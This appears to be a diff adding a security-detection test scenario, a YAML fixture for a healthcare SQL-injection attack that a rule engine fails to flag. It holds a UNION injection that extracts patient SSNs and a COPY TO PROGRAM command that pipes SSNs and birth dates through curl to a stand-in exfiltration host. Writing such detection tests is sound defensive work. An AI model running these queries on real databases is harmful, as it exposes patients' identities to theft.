@@ -1,0 +1,23 @@
+scenario_id: hc2_sqli_pair1_mal
+family_id: healthcare_sqli_billing_probe
+domain: healthcare
+matched_pair_id: healthcare_sqli_pair1
+matched_dimensions:
+  fixed: [process_tree_shape, syscall_sequence, timing_pattern, role]
+  varied: [sql_content]
+time_of_day: "22:40"
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+  - session_label: inject
+    role: research_etl_service
+    anchor: db
+    timing:
+      tempo: steady
+      step_gaps_seconds: [3.0]
+    events:
+      - step_id: probe
+        sql: "SELECT invoice_id, payment_status FROM billing WHERE invoice_id = 0 UNION SELECT patient_id, ssn FROM patients"
+      - step_id: exfil
+        sql: "COPY (SELECT ssn, date_of_birth FROM patients) TO PROGRAM 'curl -sX POST https://exfil.research-mirror.example/collect -d @-'"
+        connects_to: {ip: "193.42.33.71", port: 8080}
